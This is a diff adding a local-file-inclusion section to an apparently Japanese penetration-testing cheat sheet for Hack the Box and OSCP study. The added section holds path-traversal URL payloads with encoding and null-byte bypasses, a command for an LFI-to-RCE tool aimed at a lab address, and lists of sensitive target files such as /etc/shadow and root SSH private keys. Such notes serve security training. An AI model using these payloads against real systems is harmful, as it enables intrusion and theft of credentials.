@@ -36,6 +36,7 @@ Hack the Box の攻略や、OSCP 取得を目指すためのチートシート�
   - John the Ripper
   - hashcat
 - [SQL injection](#SQLインジェクション)
+- [LFI](#LFI)
 - [便利コマンド](#便利コマンド)
     
   
@@ -506,6 +507,59 @@ sqlmap -u 'http://localhost:5000/users' --data 'name=Alice' --dump
  ```
 
 している
+
+## LFI
+
+```
+http://<url>/script.php?page=../../../../../../../../etc/passwd
+http://<url>/script.php?page=../../../../../../../../etc/hosts
+```
+
+Examples:
+
+```
+http://example.com/index.php?page=etc/passwd
+http://example.com/index.php?page=etc/passwd%00
+http://example.com/index.php?page=../../etc/passwd
+http://example.com/index.php?page=%252e%252e%252f
+http://example.com/index.php?page=....//....//etc/passwd
+```
+  
+  
+[ライブラリ](https://github.com/takabaya-shi/LFI2RCE)
+
+```
+python lfi2rce.py --linux 10.10.10.84 /browse.php?file=../../../../../..  --error "failed to open stream" -v
+
+```
+
+- LFIを利用して読み取りを狙うファイル:
+
+Linux
+
+```
+/etc/passwd
+/etc/shadow
+/etc/issue
+/etc/group
+/etc/hostname
+/etc/ssh/ssh_config
+/etc/ssh/sshd_config
+/root/.ssh/id_rsa
+/root/.ssh/authorized_keys
+/home/user/.ssh/authorized_keys
+/home/user/.ssh/id_rsa
+```
+
+
+Windows
+
+```
+/boot.ini
+/autoexec.bat
+/windows/system32/drivers/etc/hosts
+/windows/repair/S
+```
 
 # 便利コマンド
 
